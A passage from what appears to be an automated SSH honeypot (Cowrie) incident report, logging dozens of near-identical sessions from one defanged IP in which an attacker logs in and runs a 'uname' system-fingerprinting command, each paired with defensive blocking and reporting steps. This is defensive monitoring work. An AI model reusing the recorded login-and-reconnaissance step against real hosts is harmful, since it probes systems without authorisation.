| `2026-09-05 18:15:19` | `cowrie.session.connect` |
| `2026-09-05 18:15:19` | `cowrie.client.version` |
| `2026-09-05 18:15:19` | `cowrie.client.kex` |
| `2026-09-05 18:15:19` | `cowrie.login.success` |
| `2026-09-05 18:15:20` | `cowrie.session.params` |
| `2026-09-05 18:15:20` | `cowrie.command.input` |
| `2026-09-05 18:15:20` | `cowrie.log.closed` |
| `2026-09-05 18:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0d5838d4f51

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:15 |
| **Last Seen** | 2026-09-05 18:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:15:34` | `cowrie.session.connect` |
| `2026-09-05 18:15:34` | `cowrie.client.version` |
| `2026-09-05 18:15:34` | `cowrie.client.kex` |
| `2026-09-05 18:15:34` | `cowrie.login.success` |
| `2026-09-05 18:15:35` | `cowrie.session.params` |
| `2026-09-05 18:15:35` | `cowrie.command.input` |
| `2026-09-05 18:15:35` | `cowrie.log.closed` |
| `2026-09-05 18:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13f0e311d513

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:15 |
| **Last Seen** | 2026-09-05 18:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:15:48` | `cowrie.session.connect` |
| `2026-09-05 18:15:48` | `cowrie.client.version` |
| `2026-09-05 18:15:48` | `cowrie.client.kex` |
| `2026-09-05 18:15:48` | `cowrie.login.success` |
| `2026-09-05 18:15:49` | `cowrie.session.params` |
| `2026-09-05 18:15:49` | `cowrie.command.input` |
| `2026-09-05 18:15:49` | `cowrie.log.closed` |
| `2026-09-05 18:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb5ec7531030

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:16 |
| **Last Seen** | 2026-09-05 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:16:03` | `cowrie.session.connect` |
| `2026-09-05 18:16:03` | `cowrie.client.version` |
| `2026-09-05 18:16:03` | `cowrie.client.kex` |
| `2026-09-05 18:16:03` | `cowrie.login.success` |
| `2026-09-05 18:16:03` | `cowrie.session.params` |
| `2026-09-05 18:16:03` | `cowrie.command.input` |
| `2026-09-05 18:16:03` | `cowrie.log.closed` |
| `2026-09-05 18:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e7ab84c9910

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:16 |
| **Last Seen** | 2026-09-05 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:16:17` | `cowrie.session.connect` |
| `2026-09-05 18:16:17` | `cowrie.client.version` |
| `2026-09-05 18:16:17` | `cowrie.client.kex` |
| `2026-09-05 18:16:17` | `cowrie.login.success` |
| `2026-09-05 18:16:18` | `cowrie.session.params` |
| `2026-09-05 18:16:18` | `cowrie.command.input` |
| `2026-09-05 18:16:18` | `cowrie.log.closed` |
| `2026-09-05 18:16:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd061a66ad3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:16 |
| **Last Seen** | 2026-09-05 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:16:32` | `cowrie.session.connect` |
| `2026-09-05 18:16:32` | `cowrie.client.version` |
| `2026-09-05 18:16:32` | `cowrie.client.kex` |
| `2026-09-05 18:16:32` | `cowrie.login.success` |
| `2026-09-05 18:16:32` | `cowrie.session.params` |
| `2026-09-05 18:16:32` | `cowrie.command.input` |
| `2026-09-05 18:16:33` | `cowrie.log.closed` |
| `2026-09-05 18:16:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbafde1e7775

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:16 |
| **Last Seen** | 2026-09-05 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:16:46` | `cowrie.session.connect` |
| `2026-09-05 18:16:46` | `cowrie.client.version` |
| `2026-09-05 18:16:46` | `cowrie.client.kex` |
| `2026-09-05 18:16:46` | `cowrie.login.success` |
| `2026-09-05 18:16:47` | `cowrie.session.params` |
| `2026-09-05 18:16:47` | `cowrie.command.input` |
| `2026-09-05 18:16:47` | `cowrie.log.closed` |
| `2026-09-05 18:16:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-412b3bdba5d9

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:17 |
| **Last Seen** | 2026-09-05 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:17:01` | `cowrie.session.connect` |
| `2026-09-05 18:17:01` | `cowrie.client.version` |
| `2026-09-05 18:17:01` | `cowrie.client.kex` |
| `2026-09-05 18:17:01` | `cowrie.login.success` |
| `2026-09-05 18:17:02` | `cowrie.session.params` |
| `2026-09-05 18:17:02` | `cowrie.command.input` |
| `2026-09-05 18:17:02` | `cowrie.log.closed` |
| `2026-09-05 18:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0509ba03c8b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:17 |
| **Last Seen** | 2026-09-05 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:17:16` | `cowrie.session.connect` |
| `2026-09-05 18:17:16` | `cowrie.client.version` |
| `2026-09-05 18:17:16` | `cowrie.client.kex` |
| `2026-09-05 18:17:16` | `cowrie.login.success` |
| `2026-09-05 18:17:17` | `cowrie.session.params` |
| `2026-09-05 18:17:17` | `cowrie.command.input` |
| `2026-09-05 18:17:17` | `cowrie.log.closed` |
| `2026-09-05 18:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b8470ea304e

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:17 |
| **Last Seen** | 2026-09-05 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:17:31` | `cowrie.session.connect` |
| `2026-09-05 18:17:31` | `cowrie.client.version` |
| `2026-09-05 18:17:31` | `cowrie.client.kex` |
| `2026-09-05 18:17:31` | `cowrie.login.success` |
| `2026-09-05 18:17:32` | `cowrie.session.params` |
| `2026-09-05 18:17:32` | `cowrie.command.input` |
| `2026-09-05 18:17:32` | `cowrie.log.closed` |
| `2026-09-05 18:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-caa1ca6185ad

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:17 |
| **Last Seen** | 2026-09-05 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:17:46` | `cowrie.session.connect` |
| `2026-09-05 18:17:46` | `cowrie.client.version` |
| `2026-09-05 18:17:46` | `cowrie.client.kex` |
| `2026-09-05 18:17:46` | `cowrie.login.success` |
| `2026-09-05 18:17:47` | `cowrie.session.params` |
| `2026-09-05 18:17:47` | `cowrie.command.input` |
| `2026-09-05 18:17:47` | `cowrie.log.closed` |
| `2026-09-05 18:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18fc02109077

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:18 |
| **Last Seen** | 2026-09-05 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:18:01` | `cowrie.session.connect` |
| `2026-09-05 18:18:01` | `cowrie.client.version` |
| `2026-09-05 18:18:01` | `cowrie.client.kex` |
| `2026-09-05 18:18:01` | `cowrie.login.success` |
| `2026-09-05 18:18:02` | `cowrie.session.params` |
| `2026-09-05 18:18:02` | `cowrie.command.input` |
| `2026-09-05 18:18:02` | `cowrie.log.closed` |
| `2026-09-05 18:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3592f82ad46b

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:18 |
| **Last Seen** | 2026-09-05 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:18:17` | `cowrie.session.connect` |
| `2026-09-05 18:18:17` | `cowrie.client.version` |
| `2026-09-05 18:18:17` | `cowrie.client.kex` |
| `2026-09-05 18:18:17` | `cowrie.login.success` |
| `2026-09-05 18:18:17` | `cowrie.session.params` |
| `2026-09-05 18:18:17` | `cowrie.command.input` |
| `2026-09-05 18:18:17` | `cowrie.log.closed` |
| `2026-09-05 18:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a658c090a4

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:18 |
| **Last Seen** | 2026-09-05 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:18:32` | `cowrie.session.connect` |
| `2026-09-05 18:18:32` | `cowrie.client.version` |
| `2026-09-05 18:18:32` | `cowrie.client.kex` |
| `2026-09-05 18:18:32` | `cowrie.login.success` |
| `2026-09-05 18:18:33` | `cowrie.session.params` |
| `2026-09-05 18:18:33` | `cowrie.command.input` |
| `2026-09-05 18:18:33` | `cowrie.log.closed` |
| `2026-09-05 18:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4ea8d28c33

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:18 |
| **Last Seen** | 2026-09-05 18:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:18:47` | `cowrie.session.connect` |
| `2026-09-05 18:18:47` | `cowrie.client.version` |
| `2026-09-05 18:18:47` | `cowrie.client.kex` |
| `2026-09-05 18:18:47` | `cowrie.login.success` |
| `2026-09-05 18:18:48` | `cowrie.session.params` |
| `2026-09-05 18:18:48` | `cowrie.command.input` |
| `2026-09-05 18:18:48` | `cowrie.log.closed` |
| `2026-09-05 18:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c727453f0b65

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:19 |
| **Last Seen** | 2026-09-05 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:19:03` | `cowrie.session.connect` |
| `2026-09-05 18:19:03` | `cowrie.client.version` |
| `2026-09-05 18:19:03` | `cowrie.client.kex` |
| `2026-09-05 18:19:03` | `cowrie.login.success` |
| `2026-09-05 18:19:03` | `cowrie.session.params` |
| `2026-09-05 18:19:03` | `cowrie.command.input` |
| `2026-09-05 18:19:03` | `cowrie.log.closed` |
| `2026-09-05 18:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c29561ffdef1

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:19 |
| **Last Seen** | 2026-09-05 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:19:18` | `cowrie.session.connect` |
| `2026-09-05 18:19:18` | `cowrie.client.version` |
| `2026-09-05 18:19:18` | `cowrie.client.kex` |
| `2026-09-05 18:19:18` | `cowrie.login.success` |
| `2026-09-05 18:19:19` | `cowrie.session.params` |
| `2026-09-05 18:19:19` | `cowrie.command.input` |
| `2026-09-05 18:19:19` | `cowrie.log.closed` |
| `2026-09-05 18:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ced7bc1ac259

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:19 |
| **Last Seen** | 2026-09-05 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:19:33` | `cowrie.session.connect` |
| `2026-09-05 18:19:33` | `cowrie.client.version` |
| `2026-09-05 18:19:33` | `cowrie.client.kex` |
| `2026-09-05 18:19:34` | `cowrie.login.success` |
| `2026-09-05 18:19:34` | `cowrie.session.params` |
| `2026-09-05 18:19:34` | `cowrie.command.input` |
| `2026-09-05 18:19:34` | `cowrie.log.closed` |
| `2026-09-05 18:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e79276f904f

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:19 |
| **Last Seen** | 2026-09-05 18:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:19:49` | `cowrie.session.connect` |
| `2026-09-05 18:19:49` | `cowrie.client.version` |
| `2026-09-05 18:19:49` | `cowrie.client.kex` |
| `2026-09-05 18:19:49` | `cowrie.login.success` |
| `2026-09-05 18:19:49` | `cowrie.session.params` |
| `2026-09-05 18:19:49` | `cowrie.command.input` |
| `2026-09-05 18:19:49` | `cowrie.log.closed` |
| `2026-09-05 18:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6820b07859c6

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:20 |
| **Last Seen** | 2026-09-05 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:20:04` | `cowrie.session.connect` |
| `2026-09-05 18:20:04` | `cowrie.client.version` |
| `2026-09-05 18:20:04` | `cowrie.client.kex` |
| `2026-09-05 18:20:04` | `cowrie.login.success` |
| `2026-09-05 18:20:05` | `cowrie.session.params` |
| `2026-09-05 18:20:05` | `cowrie.command.input` |
| `2026-09-05 18:20:05` | `cowrie.log.closed` |
| `2026-09-05 18:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25b079e440e0

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:20 |
| **Last Seen** | 2026-09-05 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:20:19` | `cowrie.session.connect` |
| `2026-09-05 18:20:19` | `cowrie.client.version` |
| `2026-09-05 18:20:19` | `cowrie.client.kex` |
| `2026-09-05 18:20:19` | `cowrie.login.success` |
| `2026-09-05 18:20:20` | `cowrie.session.params` |
| `2026-09-05 18:20:20` | `cowrie.command.input` |
| `2026-09-05 18:20:20` | `cowrie.log.closed` |
| `2026-09-05 18:20:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a09f22546aa

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:20 |
| **Last Seen** | 2026-09-05 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:20:34` | `cowrie.session.connect` |
| `2026-09-05 18:20:34` | `cowrie.client.version` |
| `2026-09-05 18:20:34` | `cowrie.client.kex` |
| `2026-09-05 18:20:34` | `cowrie.login.success` |
| `2026-09-05 18:20:35` | `cowrie.session.params` |
| `2026-09-05 18:20:35` | `cowrie.command.input` |
| `2026-09-05 18:20:35` | `cowrie.log.closed` |
| `2026-09-05 18:20:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8871284ffed

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:20 |
| **Last Seen** | 2026-09-05 18:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:20:49` | `cowrie.session.connect` |
| `2026-09-05 18:20:49` | `cowrie.client.version` |
| `2026-09-05 18:20:49` | `cowrie.client.kex` |
| `2026-09-05 18:20:49` | `cowrie.login.success` |
| `2026-09-05 18:20:50` | `cowrie.session.params` |
| `2026-09-05 18:20:50` | `cowrie.command.input` |
| `2026-09-05 18:20:50` | `cowrie.log.closed` |
| `2026-09-05 18:20:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa5014b8cdd3

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:21 |
| **Last Seen** | 2026-09-05 18:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:21:05` | `cowrie.session.connect` |
| `2026-09-05 18:21:05` | `cowrie.client.version` |
| `2026-09-05 18:21:05` | `cowrie.client.kex` |
| `2026-09-05 18:21:05` | `cowrie.login.success` |
| `2026-09-05 18:21:06` | `cowrie.session.params` |
| `2026-09-05 18:21:06` | `cowrie.command.input` |
| `2026-09-05 18:21:06` | `cowrie.log.closed` |
| `2026-09-05 18:21:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b64014278e56

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:21 |
| **Last Seen** | 2026-09-05 18:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:21:20` | `cowrie.session.connect` |
| `2026-09-05 18:21:20` | `cowrie.client.version` |
| `2026-09-05 18:21:20` | `cowrie.client.kex` |
| `2026-09-05 18:21:20` | `cowrie.login.success` |
| `2026-09-05 18:21:20` | `cowrie.session.params` |
| `2026-09-05 18:21:20` | `cowrie.command.input` |
| `2026-09-05 18:21:20` | `cowrie.log.closed` |
| `2026-09-05 18:21:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
- [ ] Block `159.223.174[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fffdc15e590c

| Field | Detail |
|---|---|
| **Source IP** | `159.223.174[.]116` |
| **First Seen** | 2026-09-05 18:21 |
| **Last Seen** | 2026-09-05 18:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 18:21:35` | `cowrie.session.connect` |
| `2026-09-05 18:21:35` | `cowrie.client.version` |
| `2026-09-05 18:21:35` | `cowrie.client.kex` |
| `2026-09-05 18:21:35` | `cowrie.login.success` |
| `2026-09-05 18:21:36` | `cowrie.session.params` |
| `2026-09-05 18:21:36` | `cowrie.command.input` |
| `2026-09-05 18:21:36` | `cowrie.log.closed` |
| `2026-09-05 18:21:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.174[.]116` to AbuseIPDB if not already reported
